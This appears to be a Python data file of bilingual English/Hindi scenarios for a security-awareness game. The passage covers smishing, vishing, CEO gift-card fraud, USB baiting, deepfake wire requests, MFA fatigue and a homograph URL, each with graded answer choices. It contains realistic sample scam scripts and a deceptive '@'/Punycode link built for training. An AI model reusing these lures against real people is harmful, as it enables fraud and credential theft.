"""Progressive Multi-Level Scenarios (Intermediate and Advanced) for All 30 Games.

Ensures every game in Categories A through E provides Level 1 (Beginner),
Level 2 (Intermediate), and Level 3 (Advanced) interactive challenges with
server-side validated choices, warning signs, and bilingual EN/HI content.
"""

from __future__ import annotations

PROGRESSIVE_SCENARIOS: dict[str, list[dict]] = {
    # -------------------------------------------------------------------------
    # Game 2: Smishing Showdown
    # -------------------------------------------------------------------------
    "smishing-showdown": [
        {
            "type": "sms",
            "sender": "TRAI-ALERT",
            "subject": "eSIM Migration Approval",
            "body": "Your request to convert SIM to eSIM has been received. If you did NOT request this, reply IMMEDIATELY with CANCEL followed by the 6-digit confirmation PIN sent to you.",
            "is_threat": True,
            "explanation_en": "SIM swapping / eSIM migration smishing tricks victims into forwarding authentication codes, giving attackers complete intercept capability over SMS OTPs.",
            "explanation_hi": "सिम स्वैप स्मिशिंग पीड़ित को ऑथेंटिकेशन कोड भेजने के लिए बहकाता है, जिससे हमलावर को सारे ओटीपी मिल जाते हैं।",
            "warning_signs_en": "Urgent prompt to reply with confirmation PIN, uninitiated SIM migration notice.",
            "warning_signs_hi": "पिन भेजने का दबाव, बिना अनुरोध के सिम माइग्रेशन सूचना।",
            "choices": [
                ("Reply with CANCEL and the 6-digit code", False, "This completes the attacker's SIM swap transfer request.", "यह हमलावर के सिम ट्रांसफर अनुरोध को पूरा कर देगा।"),
                ("Do not reply; call your telecom carrier directly from your handset to verify account status", True, "Excellent! Never send SMS codes back to unknown numbers.", "उत्कृष्ट! अनजान नंबरों पर कभी भी एसएमएस कोड न भेजें।"),
                ("Forward the SMS to family members", False, "Spreads confusion without securing your carrier account.", "इससे केवल भ्रम फैलेगा।")
            ]
        }
    ],

    # -------------------------------------------------------------------------
    # Game 3: Vishing Challenge
    # -------------------------------------------------------------------------
    "vishing-challenge": [
        {
            "type": "call",
            "sender": "Caller ID: HDFC Card Security Bureau",
            "subject": "Suspicious International Debit Transaction",
            "body": "'Sir, we detected an unauthorized ₹92,400 debit at an electronics store in London. To reverse this charge immediately, please read out the 6-digit one-time password we just pushed to your mobile.'",
            "is_threat": True,
            "explanation_en": "Bank fraud teams never ask customers to disclose incoming OTPs over the phone. OTPs are meant strictly for authorization, not reversal.",
            "explanation_hi": "बैंक कभी भी फोन पर आपसे ओटीपी नहीं मांगते। ओटीपी केवल लेनदेन को अधिकृत करने के लिए होते हैं।",
            "warning_signs_en": "Urgent debit claim, demand for OTP disclosure over voice call.",
            "warning_signs_hi": "अचानक भारी लेनदेन का डर, फोन पर ओटीपी मांगने का दबाव।",
            "choices": [
                ("Read the 6-digit OTP aloud to reverse the transaction", False, "The attacker will use the OTP to debit your account permanently.", "हमलावर आपके खाते से तुरंत पैसे निकाल लेगा।"),
                ("Refuse, disconnect the call, and dial the customer care number printed on your physical card", True, "Spot on! Calling the official number on your card guarantees security.", "बिल्कुल सही! कार्ड पर छपे आधिकारिक नंबर पर कॉल करना ही सुरक्षित है।"),
                ("Give your ATM PIN instead of the OTP", False, "Severe risk: never disclose any PIN or password.", "गंभीर भूल: कभी भी पिन या पासवर्ड साझा न करें।")
            ]
        },
        {
            "type": "call",
            "sender": "Caller: Telecom Regulatory Authority",
            "subject": "Aadhaar Blacklisting and Digital Arrest Ultimatum",
            "body": "'Your Aadhaar number was found registered to 14 illegal SIM cards distributing illegal content. A central cybercrime arrest warrant has been issued. Stay on this call and transfer a safety deposit of ₹1,50,000 to our verification account.'",
            "is_threat": True,
            "explanation_en": "The 'Digital Arrest' scam uses fake police uniforms, forged court warrants, and video isolation to extort massive sums. Indian law enforcement never issues 'digital arrests' or requests money transfers.",
            "explanation_hi": "डिजिटल अरेस्ट एक फर्जी घोटाला है। कोई भी पुलिस या सरकारी एजेंसी वीडियो कॉल पर पैसे ट्रांसफर करने को नहीं कहती।",
            "warning_signs_en": "Threat of arrest via phone/video, demand for 'clearance security deposit' funds.",
            "warning_signs_hi": "फोन पर गिरफ्तारी की धमकी, सुरक्षा जमा राशि ट्रांसफर करने की मांग।",
            "choices": [
                ("Transfer the ₹1,50,000 deposit to avoid police arrest", False, "You will lose your entire savings to transnational syndicates.", "आपकी पूरी बचत अपराधियों के हाथ लग जाएगी।"),
                ("Immediately disconnect, inform your family, and lodge a complaint on cybercrime.gov.in (1930)", True, "Flawless! Law enforcement does not conduct trials or arrests via telephone.", "शानदार! तुरंत 1930 या साइबर क्राइम पोर्टल पर शिकायत दर्ज करें।"),
                ("Beg the caller for mercy and offer your jewellery", False, "Scammers exploit emotional vulnerability to extort more.", "घबराएं नहीं, यह पूरी तरह से फर्जी कॉल है।")
            ]
        }
    ],

    # -------------------------------------------------------------------------
    # Game 4: Impersonation Trap
    # -------------------------------------------------------------------------
    "impersonation-trap": [
        {
            "type": "office_visit",
            "sender": "Visitor: 'CoolAir HVAC Services'",
            "subject": "Emergency Server Room Cooling Duct Inspection",
            "body": "A technician wearing blue overalls arrives at the corporate reception without prior ticket notification, claiming: 'Central AC is failing above the main rack. Open the restricted server door immediately or the blades will overheat in 20 minutes.'",
            "is_threat": True,
            "explanation_en": "Physical tailgating and emergency pretexting exploit urgency to gain physical access to server vaults and network switches.",
            "explanation_hi": "आपातकालीन बहाना बनाकर सर्वर रूम में घुसना फिजिकल सोशल इंजीनियरिंग का आम तरीका है।",
            "warning_signs_en": "Unscheduled vendor visit, artificial panic, demand for unescorted server vault entry.",
            "warning_signs_hi": "बिना पूर्व सूचना के दौरा, तुरंत सर्वर रूम खोलने का दबाव।",
            "choices": [
                ("Swipe your master keycard to let the technician in immediately", False, "Allows unauthorized physical planting of network taps or keyloggers.", "अनधिकृत व्यक्ति सर्वर में कीलॉगर या जासूसी उपकरण लगा सकता है।"),
                ("Ask the technician to wait in the lobby while you verify the work order with Facilities Management", True, "Perfect! Physical security protocols require verified work orders and escorts.", "उत्कृष्ट! कार्य आदेश और सत्यापन के बिना किसी को अंदर न जाने दें।"),
                ("Hand your keycard to the technician and return to your desk", False, "Severe physical security breach.", "गंभीर सुरक्षा उल्लंघन: अपना कार्ड कभी किसी को न दें।")
            ]
        },
        {
            "type": "email",
            "sender": "Office of the Chief Executive Officer <ceo-direct@executive-mail.org>",
            "subject": "Confidential Task: Client Appreciation Gift Cards",
            "body": "Team Member,\n\nI am currently in an all-day confidential board meeting and cannot take calls. I need you to purchase 10 Apple gift cards of $500 each for VIP investors right away. Scratch the codes and email photos to this address. I will sign your expense reimbursement tomorrow.",
            "is_threat": True,
            "explanation_en": "Gift card CEO fraud exploits hierarchy and fear of questioning authority to extract untraceable, non-reversible funds.",
            "explanation_hi": "सीईओ के नाम पर गिफ्ट कार्ड मांगने का घोटाला उच्च पद के डर का फायदा उठाता है।",
            "warning_signs_en": "Inability to talk, request for gift cards, external non-corporate domain.",
            "warning_signs_hi": "फोन न उठाने का बहाना, गिफ्ट कार्ड की मांग, बाहरी ईमेल डोमेन।",
            "choices": [
                ("Rush to the nearest convenience store and purchase the gift cards", False, "Gift card funds are redeemed overseas within seconds and cannot be recovered.", "गिफ्ट कार्ड के पैसे तुरंत भुना लिए जाते हैं और वापस नहीं मिलते।"),
                ("Verify the request in person with the CEO's executive assistant and report the email to SOC", True, "Spot on! Executives never conduct company procurement via personal gift cards.", "बिल्कुल सही! कंपनी का खर्च कभी भी गिफ्ट कार्ड से नहीं होता।"),
                ("Reply with your company credit card number", False, "Doubles the financial risk.", "क्रेडिट कार्ड नंबर कभी ईमेल में न भेजें।")
            ]
        }
    ],

    # -------------------------------------------------------------------------
    # Game 5: Bait or Truth
    # -------------------------------------------------------------------------
    "bait-or-truth": [
        {
            "type": "usb",
            "sender": "Physical Dropped Media: USB Stick",
            "subject": "Flash Drive labeled 'Executive Compensation & Bonus Q4'",
            "body": "You find a sleek metallic 64GB USB drive lying next to the cafeteria coffee machine with a printed label: 'Confidential: Executive Bonuses & Staff Layoff Matrix'.",
            "is_threat": True,
            "explanation_en": "USB baiting relies on human curiosity. Dropped drives frequently carry Rubber Ducky HID keystroke injectors or auto-executing ransomware.",
            "explanation_hi": "यूएसबी बैटिंग मानव जिज्ञासा पर निर्भर करती है। छोड़े गए पेनड्राइव में अक्सर मैलवेयर होते हैं।",
            "warning_signs_en": "Unattended USB drive in public area, provocative sensational label.",
            "warning_signs_hi": "लावारिस पेनड्राइव, संवेदनशील और आकर्षक लेबल।",
            "choices": [
                ("Plug the drive into your company laptop to identify the owner", False, "Automatic HID injection executes malicious payloads in milliseconds.", "पेनड्राइव लगाते ही कुछ ही मिलीसेकंड में मैलवेयर निष्पादित हो जाएगा।"),
                ("Do not plug in; surrender the drive to Security or the SOC forensic analysis desk", True, "Flawless! Never insert untrusted storage devices into corporate computers.", "शानदार! अज्ञात पेनड्राइव को कभी भी कंप्यूटर में न लगाएं, सुरक्षा टीम को दें।"),
                ("Take it home and plug it into your personal family PC", False, "Infects your personal home network and personal accounts.", "आपके घर का कंप्यूटर और निजी डेटा खतरे में पड़ जाएगा।")
            ]
        },
        {
            "type": "page",
            "sender": "Browser Notification: System Driver Hub",
            "subject": "Critical Browser Vulnerability: Update Chrome Font Pack",
            "body": "A full-screen modal pops up on a news site claiming: 'The Roboto Chrome Font pack is missing. Download Update_Font_Patch.exe to view this webpage correctly.'",
            "is_threat": True,
            "explanation_en": "Fake browser update/font lures (ClearFake) distribute infostealers like Lumma and RedLine packaged as executable files.",
            "explanation_hi": "फर्जी फॉन्ट या ब्राउज़र अपडेट के नाम पर इन्फोस्टीलर वायरस डाउनलोड करवाए जाते हैं।",
            "warning_signs_en": "Webpage demanding executable download to render fonts, .exe file for browser assets.",
            "warning_signs_hi": "फॉन्ट के लिए .exe फाइल डाउनलोड करने की मांग।",
            "choices": [
                ("Download and execute the patch file", False, "Installs an infostealer that extracts saved browser passwords and session cookies.", "यह वायरस आपके ब्राउज़र में सहेजे गए पासवर्ड चुरा लेगा।"),
                ("Close the browser tab and report the deceptive domain", True, "Correct! Browsers never require external .exe downloads to render fonts.", "सही! फॉन्ट लोड करने के लिए कभी भी .exe फाइल की जरूरत नहीं होती।"),
                ("Share the link on social media", False, "Exposes other users to the drive-by malware download.", "दूसरों को भी जोखिम में डालता है।")
            ]
        }
    ],

    # -------------------------------------------------------------------------
    # Game 6: Deepfake Detective
    # -------------------------------------------------------------------------
    "deepfake-detective": [
        {
            "type": "video_call",
            "sender": "Video Conference: 'CFO John Reynolds'",
            "subject": "Urgent Secret Corporate Acquisition Wire",
            "body": "In a video call, the CFO appears on camera with faint digital halos around his face and slightly robotic audio cadence, commanding: 'We are closing a secret foreign merger today. Wire $2.4M to this Hong Kong bank right now. Do not discuss this with anyone.'",
            "is_threat": True,
            "explanation_en": "Synthetic deepfake video calls with multi-voice cloning have been used in real attacks to steal tens of millions of dollars from multinational corporations.",
            "explanation_hi": "डीपफेक वीडियो कॉल में एआई से चेहरा और आवाज बदलकर करोड़ों की ठगी की जाती है।",
            "warning_signs_en": "Facial edge blurring/artifacts, unnatural blinking patterns, demand to bypass dual-signoff wire controls.",
            "warning_signs_hi": "चेहरे के किनारों पर धुंधलापन, अप्राकृतिक पलकें, सामान्य प्रक्रिया से बचने का दबाव।",
            "choices": [
                ("Initiate the $2.4M wire transfer since the CFO was on camera", False, "Causes catastrophic irreversible corporate financial loss.", "कंपनी को भारी वित्तीय नुकसान होगा।"),
                ("Pause the wire, request an in-person challenge question only the real CFO knows, and verify via out-of-band channels", True, "Superb! Multi-factor out-of-band approval is mandatory for financial wires.", "शानदार! वित्तीय लेनदेन के लिए हमेशा अलग माध्यम से सत्यापन अनिवार्य है।"),
                ("Reply with your personal bank details", False, "Completely improper response.", "अनुचित कदम।")
            ]
        },
        {
            "type": "voice_note",
            "sender": "WhatsApp Audio Note: 'Daughter / Family Member'",
            "subject": "Emergency Bail Distress Call",
            "body": "A panicked voice identical to a loved one plays: 'Mom, I got into a car accident and someone is injured. The police are holding me at the precinct! Send ₹50,000 immediately to this lawyer's UPI ID: advocate-settle@okaxis or I will be jailed!'",
            "is_threat": True,
            "explanation_en": "AI voice clone kidnapping/accident scams harvest short voice samples from social media reels and synthesize frantic distress calls.",
            "explanation_hi": "सोशल मीडिया से आवाज की नकल करके एआई वॉयस क्लोनिंग द्वारा आपातकालीन ठगी की जाती है।",
            "warning_signs_en": "Extreme panic, demand for immediate UPI money, request not to call their regular phone.",
            "warning_signs_hi": "अत्यधिक घबराहट, तत्काल यूपीआई भुगतान की मांग।",
            "choices": [
                ("Send ₹50,000 on UPI without delay", False, "Funds are instantly moved across mule accounts.", "पैसे तुरंत धोखेबाजों के हाथ चले जाएंगे।"),
                ("Hang up and call your loved one's actual mobile number, or contact someone known to be with them", True, "Excellent! Always verify family emergencies by calling the person directly.", "उत्कृष्ट! हमेशा व्यक्ति के मूल नंबर पर सीधे फोन करके पुष्टि करें।"),
                ("Post about the accident on social media", False, "Causes unnecessary panic without verifying the facts.", "बिना पुष्टि के सार्वजनिक रूप से साझा न करें।")
            ]
        }
    ],

    # -------------------------------------------------------------------------
    # Game 7: Password Fortress
    # -------------------------------------------------------------------------
    "password-fortress": [
        {
            "type": "policy",
            "sender": "Identity & Access Review",
            "subject": "Password Generation Strategy",
            "body": "Select the strongest, most resilient password architecture for an enterprise administrator account:",
            "is_threat": False,
            "explanation_en": "Passphrases of 4+ random words (16+ chars) combined with a password manager offer superior entropy and resistance against offline GPU brute-force attacks compared to short mutated passwords.",
            "explanation_hi": "16 से अधिक वर्णों वाले लंबे पासफ़्रेज पासवर्ड क्रैकिंग के खिलाफ सबसे अधिक सुरक्षित होते हैं।",
            "warning_signs_en": "Short passwords with simple character substitutions (e.g. P@ssw0rd1) are cracked in seconds by modern hashcat rigs.",
            "warning_signs_hi": "छोटे पासवर्ड को आधुनिक कंप्यूटर सेकंडों में क्रैक कर लेते हैं।",
            "choices": [
                ("Admin2024!", False, "Predictable pattern cracked in less than 2 seconds.", "यह पासवर्ड 2 सेकंड में क्रैक हो जाएगा।"),
                ("correct-horse-battery-staple-secure#99", True, "Ideal! 38-character passphrase with massive entropy and high memorability.", "उत्कृष्ट! उच्च एन्ट्रॉपी वाला मजबूत पासफ़्रेज।"),
                ("1234567890", False, "The most commonly breached password in world history.", "दुनिया का सबसे कमजोर पासवर्ड।")
            ]
        },
        {
            "type": "practice",
            "sender": "Credential Hygiene Alert",
            "subject": "Password Reuse Risk Assessment",
            "body": "An employee uses the same password for their personal Netflix account, their banking app, and their corporate single-sign-on (SSO) login. What is the risk?",
            "is_threat": True,
            "explanation_en": "Password reuse leads directly to Credential Stuffing. When a single third-party site is breached, automated botnets test the credentials against thousands of enterprise portals.",
            "explanation_hi": "एक ही पासवर्ड बार-बार उपयोग करने से क्रेडेंशियल स्टफिंग हमलों का खतरा रहता है।",
            "warning_signs_en": "Shared password across personal entertainment and enterprise infrastructure.",
            "warning_signs_hi": "निजी और कार्यालयीन खातों के लिए एक ही पासवर्ड।",
            "choices": [
                ("No risk as long as the password contains a capital letter and digit", False, "Breached plaintext databases bypass complexity rules entirely.", "डेटा लीक होने पर जटिलता नियम भी काम नहीं आते।"),
                ("High vulnerability: Use a reputable password manager to generate unique passwords for every service", True, "Spot on! Unique passwords isolate breaches to a single service.", "बिल्कुल सही! पासवर्ड मैनेजर से हर सेवा के लिए अलग पासवर्ड बनाएं।"),
                ("Write down the password on a sticky note pasted under the keyboard", False, "Exposes credentials to physical theft.", "कीबोर्ड के नीचे पासवर्ड लिखकर रखना असुरक्षित है।")
            ]
        }
    ],

    # -------------------------------------------------------------------------
    # Game 8: MFA Guardian
    # -------------------------------------------------------------------------
    "mfa-guardian": [
        {
            "type": "alert",
            "sender": "Duo / Okta Authenticator",
            "subject": "MFA Fatigue (Push Bombing) Attack",
            "body": "At 2:30 AM, your phone buzzes with 28 consecutive push notifications: 'Are you signing in to Corporate VPN from Vladivostok, Russia?' followed by a WhatsApp message claiming: 'Please approve the push to stop the alerts.'",
            "is_threat": True,
            "explanation_en": "MFA Fatigue / Push Bombing wears down users until they approve the push just to stop the barrage. Modern security mandates number matching or FIDO2 hardware keys.",
            "explanation_hi": "पुश बॉम्बिंग में हमलावर लगातार नोटिफिकेशन भेजकर यूजर को परेशान करके अप्रूवल पाने की कोशिश करता है।",
            "warning_signs_en": "Repeated unauthorized pushes, unusual geography, pressure to approve.",
            "warning_signs_hi": "लगातार अनधिकृत पुश नोटिफिकेशन, असामान्य लोकेशन।",
            "choices": [
                ("Tap 'Approve' so your phone stops buzzing and you can sleep", False, "Grants the attacker immediate authenticated corporate VPN access.", "हमलावर को कंपनी के नेटवर्क में प्रवेश मिल जाएगा।"),
                ("Tap 'Deny & Report Fraud' immediately, then notify the SOC team", True, "Excellent! Denying the push and alerting the SOC stops the breach.", "उत्कृष्ट! 'अस्वीकार करें' चुनें और सुरक्षा टीम को रिपोर्ट करें।"),
                ("Turn off your phone and ignore it until morning", False, "Leaves compromised passwords active without alerting defenders.", "पासवर्ड लीक की रिपोर्ट न करने से जोखिम बना रहता है।")
            ]
        },
        {
            "type": "architecture",
            "sender": "Cybersecurity Architecture Team",
            "subject": "Selecting the Most Resilient MFA Factor",
            "body": "Which MFA technology provides the highest resistance against Adversary-in-the-Middle (AiTM) phishing proxies like Evilginx?",
            "is_threat": False,
            "explanation_en": "FIDO2 / WebAuthn hardware security keys (e.g. YubiKey) cryptographically bind authentication to the legitimate domain URL, completely defeating reverse-proxy phishing.",
            "explanation_hi": "FIDO2 हार्डवेयर की डोमेन से बंधी होती हैं और फ़िशिंग प्रॉक्सी को विफल कर देती हैं।",
            "warning_signs_en": "SMS OTPs and basic push prompts can be intercepted by real-time reverse proxies.",
            "warning_signs_hi": "एसएमएस ओटीपी को प्रॉक्सी के जरिए बीच में पकड़ा जा सकता है।",
            "choices": [
                ("SMS One-Time Passwords sent over cellular network", False, "Vulnerable to SIM swapping and SS7 interception.", "सिम स्वैपिंग के प्रति संवेदनशील।"),
                ("FIDO2 / WebAuthn Hardware Security Keys (YubiKey / Passkeys)", True, "Perfect! Phishing-resistant credentials bound to origin domain.", "शानदार! फ़िशिंग-प्रतिरोधी हार्डवेयर टोकन सबसे सुरक्षित हैं।"),
                ("Email verification links", False, "Vulnerable to email compromise.", "ईमेल हैक होने पर असुरक्षित।")
            ]
        }
    ],

    # -------------------------------------------------------------------------
    # Game 9: Account Recovery Rescue
    # -------------------------------------------------------------------------
    "account-recovery-rescue": [
        {
            "type": "ticket",
            "sender": "Helpdesk Recovery Request: User 'Vikram Joshi'",
            "subject": "Lost Phone & Authenticator Bypass Request",
            "body": "A caller claiming to be an overseas remote employee requests: 'I dropped my phone in the ocean. I urgently need access to close a client sale. Please reset my MFA without ID verification right away.'",
            "is_threat": True,
            "explanation_en": "Social engineering against helpdesks is a primary vector for identity takeover (e.g., MGM Resorts breach). Strict out-of-band video verification is required.",
            "explanation_hi": "हेल्पडेस्क पर दबाव डालकर पासवर्ड रीसेट करवाना बड़े साइबर हमलों का प्रमुख कारण है।",
            "warning_signs_en": "Request to bypass mandatory verification procedures, artificial sales urgency.",
            "warning_signs_hi": "पहचान सत्यापन से बचने का दबाव, बिक्री का बहाना।",
            "choices": [
                ("Bypass verification and reset the MFA token immediately", False, "Handing over account control to an unverified impostor.", "अनधिकृत व्यक्ति को खाते का नियंत्रण मिल जाएगा।"),
                ("Adhere to strict verification protocol: require live video identity check and manager authorization", True, "Flawless! Rigorous recovery protocols prevent social engineering takeovers.", "बिल्कुल सही! लाइव वीडियो और मैनेजर सत्यापन अनिवार्य है।"),
                ("Post the temporary recovery code in an unencrypted chat channel", False, "Leaks sensitive credentials.", "क्रेडेंशियल लीक हो जाएंगे।")
            ]
        },
        {
            "type": "policy",
            "sender": "Identity Security Audit",
            "subject": "Security Question Vulnerability",
            "body": "An application relies on questions like 'What is your mother's maiden name?' and 'What high school did you attend?' for password recovery. Why is this insecure?",
            "is_threat": True,
            "explanation_en": "Answers to standard security questions are easily discoverable on social media, public voter registries, or geneology databases.",
            "explanation_hi": "सुरक्षा प्रश्नों के उत्तर सोशल मीडिया या सार्वजनिक रिकॉर्ड से आसानी से पता लगाए जा सकते हैं।",
            "warning_signs_en": "Publicly discoverable answers used as single-factor authentication recovery.",
            "warning_signs_hi": "आसानी से खोजे जाने वाले व्यक्तिगत प्रश्न।",
            "choices": [
                ("Completely secure if the user writes them in lower-case letters", False, "Case variations provide virtually no security.", "केस बदलने से सुरक्षा नहीं बढ़ती।"),
                ("Highly vulnerable: Deprecate static questions in favor of hardware-bound recovery keys or multi-party admin verification", True, "Spot on! Static security questions are obsolete and insecure.", "शानदार! स्थिर सुरक्षा प्रश्न अप्रचलित और असुरक्षित हैं।"),
                ("Share the answers with your friends for safekeeping", False, "Compromises personal privacy.", "गोपनीयता का उल्लंघन।")
            ]
        }
    ],

    # -------------------------------------------------------------------------
    # Game 10: Credential Leak Detective
    # -------------------------------------------------------------------------
    "credential-leak-detective": [
        {
            "type": "darkweb_feed",
            "sender": "Threat Intelligence Feed: HaveIBeenPwned / DarkWeb",
            "subject": "Third-Party Breach Detection: 15 Employee Records Found",
            "body": "Intel alert: Credentials matching company email addresses appeared in a leaked database from a third-party cooking blog. Several passwords match the enterprise hash pattern.",
            "is_threat": True,
            "explanation_en": "Credential stuffing bots immediately test dark web leak dumps against corporate SSO portals. Fast automated remediation is vital.",
            "explanation_hi": "डार्क वेब पर लीक हुए पासवर्ड का उपयोग हैकर्स कंपनी के पोर्टल में घुसने के लिए करते हैं।",
            "warning_signs_en": "Exposed employee credentials on public dark web forums.",
            "warning_signs_hi": "डार्क वेब पर कंपनी ईमेल और पासवर्ड की मौजूदगी।",
            "choices": [
                ("Ignore since the breach occurred on an external cooking website", False, "Fails to protect against password reuse and credential stuffing.", "पासवर्ड दोबारा इस्तेमाल होने पर खतरा बना रहेगा।"),
                ("Force immediate password resets for affected users, revoke active sessions, and check for anomalous logins", True, "Flawless threat mitigation! Eliminates the attack window.", "उत्कृष्ट! तुरंत पासवर्ड रीसेट करें और सक्रिय सत्र समाप्त करें।"),
                ("Email the affected users their plaintext passwords to remind them", False, "Severe risk: never email plaintext credentials.", "ईमेल में कभी पासवर्ड न भेजें।")
            ]
        },
        {
            "type": "infostealer",
            "sender": "Endpoint Security Watch",
            "subject": "Session Cookie Hijacking (Pass-the-Cookie)",
            "body": "An employee ran an unapproved utility that extracted Chrome `Cookies.sqlite` database containing valid Okta session tokens.",
            "is_threat": True,
            "explanation_en": "Infostealers harvest active session cookies, allowing attackers to bypass MFA completely because the session is already authenticated.",
            "explanation_hi": "इन्फोस्टीलर सेशन कुकीज चुराकर बिना पासवर्ड या ओटीपी के सीधे लॉगिन कर लेते हैं।",
            "warning_signs_en": "Unauthorized tool accessing browser sqlite profile directories.",
            "warning_signs_hi": "ब्राउज़र कुकीज तक अनधिकृत पहुंच।",
            "choices": [
                ("Change only the user password and leave sessions active", False, "Existing stolen session tokens remain valid until expiration.", "पुराने सेशन टोकन काम करते रहेंगे।"),
                ("Revoke all active SSO session tokens immediately, wipe the compromised workstation, and re-issue identity tokens", True, "Master response! Revoking tokens invalidates stolen cookies instantly.", "शानदार! टोकन रद्द करने से चोरी की गई कुकीज बेकार हो जाती हैं।"),
                ("Clear browser cache on the user's phone", False, "Irrelevant to the compromised PC session.", "अनुपयोगी कदम।")
            ]
        }
    ],

    # -------------------------------------------------------------------------
    # Game 11: Access Control Master
    # -------------------------------------------------------------------------
    "access-control-master": [
        {
            "type": "rbac",
            "sender": "IAM Permission Request",
            "subject": "Over-Privileged Access Request: Temporary Intern",
            "body": "A 2-month summer marketing intern requests permanent AWS 'AdministratorAccess' policy to upload 3 image banners to an S3 bucket.",
            "is_threat": True,
            "explanation_en": "Violating the Principle of Least Privilege exposes the entire cloud tenant to catastrophic deletion or cryptomining if the intern's laptop is compromised.",
            "explanation_hi": "न्यूनतम विशेषाधिकार के नियम का उल्लंघन करने से पूरा क्लाउड ढांचा खतरे में पड़ जाता है।",
            "warning_signs_en": "Full administrative permissions requested for a narrow storage task.",
            "warning_signs_hi": "छोटे काम के लिए पूर्ण प्रशासनिक अधिकार मांगना।",
            "choices": [
                ("Approve AdministratorAccess because it is simpler than configuring fine-grained policies", False, "Severe over-privileging violation.", "गंभीर सुरक्षा उल्लंघन।"),
                ("Reject AdministratorAccess; grant least-privilege 's3:PutObject' scoped strictly to the specific marketing bucket with time-bound expiry", True, "Perfect RBAC hygiene! Grants only the minimum necessary permission.", "उत्कृष्ट! केवल संबंधित बकेट के लिए आवश्यक सीमित अनुमति दें।"),
                ("Give the intern your personal root cloud credentials", False, "Disastrous security failure.", "विनाशकारी भूल।")
            ]
        },
        {
            "type": "offboarding",
            "sender": "HR & Security Workflow",
            "subject": "Offboarding Deprovisioning Protocol",
            "body": "A senior DevOps engineer with access to production database keys resigns today. What must happen to their access?",
            "is_threat": False,
            "explanation_en": "Prompt offboarding deprovisioning and shared key rotation prevents unauthorized post-employment data tampering or extortion.",
            "explanation_hi": "कर्मचारी के जाने पर तुरंत सभी एक्सेस बंद करना और कुंजियां बदलना अनिवार्य है।",
            "warning_signs_en": "Orphaned accounts belonging to former employees are prime targets for quiet intrusions.",
            "warning_signs_hi": "पूर्व कर्मचारियों के सक्रिय खाते घुसपैठियों का आसान शिकार होते हैं।",
            "choices": [
                ("Leave the accounts open in case the team needs to ask questions next month", False, "Creates a dangerous backdoor vulnerable to compromise.", "खतरनाक बैकडोर बन जाता है।"),
                ("Disable accounts across all identity providers immediately at departure, revoke SSH keys, and rotate shared database credentials", True, "Flawless offboarding governance! Zero residual access risk.", "शानदार! प्रस्थान के तुरंत बाद सभी एक्सेस समाप्त करें।"),
                ("Change only their email password", False, "Leaves cloud, VPN, and database access wide open.", "अन्य सभी एक्सेस खुले रह जाएंगे।")
            ]
        }
    ],

    # -------------------------------------------------------------------------
    # Game 12: Wi-Fi Safety Mission
    # -------------------------------------------------------------------------
    "wifi-safety-mission": [
        {
            "type": "wireless",
            "sender": "Wi-Fi Scanner: Airport Terminal",
            "subject": "Rogue Hotspot / Evil Twin Detected",
            "body": "Your laptop discovers two networks: 1) 'Airport_Free_WiFi' (requires portal login) and 2) 'Airport_Free_WiFi_Fast_UNSECURED' (open, no encryption). Which do you connect to?",
            "is_threat": True,
            "explanation_en": "Attackers deploy Pineapple routers broadcasting identical SSIDs with open settings to perform Man-in-the-Middle (MitM) credential interception.",
            "explanation_hi": "हैकर्स नकली ओपन वाई-फाई नेटवर्क बनाकर सारा डेटा बीच में ही चुरा लेते हैं।",
            "warning_signs_en": "Open unencrypted clone network, absence of WPA2/WPA3 security.",
            "warning_signs_hi": "बिना पासवर्ड वाला खुला नकली नेटवर्क।",
            "choices": [
                ("Connect to the unsecured fast clone because it has higher signal strength", False, "Directly routes your traffic through an attacker-controlled MITM proxy.", "आपका सारा ट्रैफिक हमलावर के पास जाएगा।"),
                ("Avoid the unencrypted clone; use your cellular mobile hotspot or verify official airport network credentials and enable VPN", True, "Master wireless security! Cellular tethering and VPN protect against rogue APs.", "शानदार! मोबाइल हॉटस्पॉट या वीपीएन का उपयोग करें।"),
                ("Turn off your firewall so the network connects faster", False, "Removes your system defenses.", "सुरक्षा पूरी तरह खत्म।")
            ]
        },
        {
            "type": "ssl_warning",
            "sender": "Browser Security Warning: Coffee Shop",
            "subject": "Untrusted SSL Certificate on Public Wi-Fi",
            "body": "While connected to a café network, your browser warns: 'Your connection is not private. An attacker may be trying to steal your information from bank.com (NET::ERR_CERT_AUTHORITY_INVALID).'",
            "is_threat": True,
            "explanation_en": "Certificate authority invalid warnings on public Wi-Fi indicate an active SSL-stripping or proxy interception attack attempting to decrypt your TLS traffic.",
            "explanation_hi": "सार्वजनिक वाई-फाई पर एसएसएल प्रमाणपत्र त्रुटि का अर्थ है कि कोई आपका डेटा डिक्रिप्ट करने की कोशिश कर रहा है।",
            "warning_signs_en": "SSL certificate invalidity, self-signed certificate replacing known enterprise bank cert.",
            "warning_signs_hi": "अमान्य एसएसएल प्रमाणपत्र चेतावनी।",
            "choices": [
                ("Click 'Advanced -> Proceed to bank.com (unsafe)' to check your balance", False, "Your banking credentials will be transmitted in decrypted plaintext to the attacker.", "पासवर्ड और डेटा हमलावर के पास चला जाएगा।"),
                ("Immediately disconnect from the Wi-Fi network and report possible MITM tampering", True, "Spot on! Never bypass TLS certificate warnings on untrusted networks.", "बिल्कुल सही! तुरंत नेटवर्क से हटें, चेतावनी को नजरअंदाज न करें।"),
                ("Disable HTTPS inside browser settings", False, "Extremely dangerous.", "अत्यंत खतरनाक।")
            ]
        }
    ],

    # -------------------------------------------------------------------------
    # Game 13: URL Inspector
    # -------------------------------------------------------------------------
    "url-inspector": [
        {
            "type": "url_analysis",
            "sender": "Incoming Web Link",
            "subject": "Internationalized Domain Name (IDN) Homograph Attack",
            "body": "Inspect this URL closely: `https://www.apple.com∕login@xn--pple-43d.com/auth`",
            "is_threat": True,
            "explanation_en": "The URL uses Punycode (`xn--pple-43d.com`) with a Cyrillic character resembling 'a', and uses `@` notation to mislead users into believing they are visiting apple.com.",
            "explanation_hi": "दिखने में असली लगने वाले लेकिन असल में रूसी या ग्रीक अक्षरों से बने नकली डोमेन (होमोग्राफ हमला)।",
            "warning_signs_en": "Punycode domain prefix (xn--), '@' character diverting destination.",
            "warning_signs_hi": "प्यूनिकोड डोमेन (xn--), भ्रमित करने वाला '@' चिन्ह।",
            "choices": [
                ("Safe: The URL clearly begins with 'www.apple.com'", False, "The browser connects to the domain AFTER the '@' symbol (the attacker's server).", "ब्राउज़र '@' के बाद वाले हमलावर के पते पर जाएगा।"),
